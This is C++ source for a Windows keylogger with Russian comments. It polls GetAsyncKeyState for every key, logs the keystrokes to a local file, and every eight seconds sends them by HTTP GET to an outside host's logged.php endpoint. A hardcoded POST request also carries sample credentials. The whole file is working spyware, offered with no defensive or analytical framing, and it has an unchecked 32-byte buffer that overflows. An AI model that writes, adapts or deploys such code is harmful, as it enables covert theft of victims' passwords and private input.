// Logger.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#include <iostream>
#include <fstream>
#include "winsock2.h"
#include "Windows.h"
#pragma comment(lib,"ws2_32.lib")

#define request2 "POST http:n9095863.bget.ru/logged.php HTTP/1.0\r\nHost: www.n9095863.bget.ru\r\nReferer: http:n9095863.bget.ru/logged.php\r\nCookie: income=1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 35\r\n\r\ndata=Dimas&password=12345" 
#define request "GET /logged.php?data=test2 HTTP/1.0 \r\nHost: www.n9095863.bget.ru\r\n\r\n" // HTML запрос. 
#define MAX_PACKET_SIZE 1024
using namespace std;

DWORD WINAPI thread2(LPVOID t)//слив через другой поток
{

	while (true)
	{
		Sleep(12000);
	}
	return 0;
}
int main(int argc, char** argv)
{
	ofstream out;

	//HANDLE thread = CreateThread(NULL, 0, thread2, NULL, 0, NULL);
	int timer = 0;
	char *buffer;
	buffer = (char*)malloc(32);
	int z = 0;
	WSADATA ws;
	SOCKET s;
	sockaddr_in adr;
	hostent* hn;
	char buff[MAX_PACKET_SIZE];

	// Init 
	if (WSAStartup(0x0101, &ws) != 0)
	{
		// Error
		return -1;
	}
	// Socket open
	if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)))
	{
		// Error
		return -1;
	}

	// Get adress
	if (NULL == (hn = gethostbyname("www.n9095863.bget.ru")))
	{
		// Error
		return -1;
	}

	// Fill structure
	adr.sin_family = AF_INET;
	adr.sin_addr.S_un.S_addr = *(DWORD*)hn->h_addr_list[0];
	adr.sin_port = htons(80);

	// Connect to server
	if (SOCKET_ERROR == connect(s, (sockaddr*)&adr, sizeof(adr)))
	{
		// Error
		printf("Connection error");
		return -1;
	}



	while (true)
	{
		Sleep(400);
		timer += 400;
		for (int i = 0; i<255; i++)
		{
			int state = GetAsyncKeyState(i);
			if (state == 1 || state == -3276)
			{
				buffer[z++] = (char)i;
				//printf("%c",i);
			}
		}
		if (timer % 8000 == 0) {
			// Init 
			if (WSAStartup(0x0101, &ws) != 0)
			{
				// Error
				return -1;
			}
			// Socket open
			if (INVALID_SOCKET == (s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)))
			{
				// Error
				return -1;
			}

			// Get adress
			if (NULL == (hn = gethostbyname("www.n9095863.bget.ru")))
			{
				// Error
				return -1;
			}

			// Fill structure
			adr.sin_family = AF_INET;
			adr.sin_addr.S_un.S_addr = *(DWORD*)hn->h_addr_list[0];
			adr.sin_port = htons(80);

			// Connect to server
			if (SOCKET_ERROR == connect(s, (sockaddr*)&adr, sizeof(adr)))
			{
				// Error
				printf("Connection error");
				return -1;
			}
			if (z == 0) {
				buffer[z] = '0';
				buffer[z + 1] = '\0';
			}
			else buffer[z] = '\0';
			char requestString[300];
			out.open("test.txt", ofstream::out | ofstream::app);
			if (out.is_open())
				out << buffer;
			else
				cerr << "Open file failed." << endl;
			out.close();
			strcpy(requestString, "GET /logged.php?data=");
			strcat(requestString, buffer);
			strcat(requestString, " HTTP/1.0 \r\nHost: www.n9095863.bget.ru\r\n\r\n");
			// Request sending
			if (SOCKET_ERROR == send(s, requestString, sizeof(requestString), 0))
			{
				// Error
				printf("error2");
				return -1;
			}

			// Recive ansver
			int len = recv(s, (char *)&buff, MAX_PACKET_SIZE, 0);

			if ((len == SOCKET_ERROR) || (len == 0))
			{
				// Error
				printf("error3 len=%d", len);
				//return -1;
			}

			// Print result
			for (int i = 0; i<MAX_PACKET_SIZE; i++) {
				printf("%c", buff[i]);
			}
			//requestString[0] = '\0';
			//buff[0] = '\0';
			z = 0;

			free(buffer);
			buffer = (char*)malloc(32);
			if (SOCKET_ERROR == closesocket(s))
			{
				// Error
				return -1;
			}
		}
	}
	// Close socket
	if (SOCKET_ERROR == closesocket(s))
	{
		// Error
		return -1;
	}
	system("pause");
	return 0;
}


